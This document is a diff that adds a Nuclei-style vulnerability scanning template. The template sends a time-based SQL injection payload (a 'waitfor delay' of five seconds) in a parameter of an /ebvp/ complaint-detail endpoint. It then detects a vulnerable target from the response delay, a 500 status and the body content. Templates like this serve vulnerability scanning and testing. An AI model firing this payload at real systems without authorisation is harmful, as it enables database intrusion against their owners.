@@ -1,0 +1,27 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - duration > 5 && status_code==500 && contains_all(body,'/ebvp/')
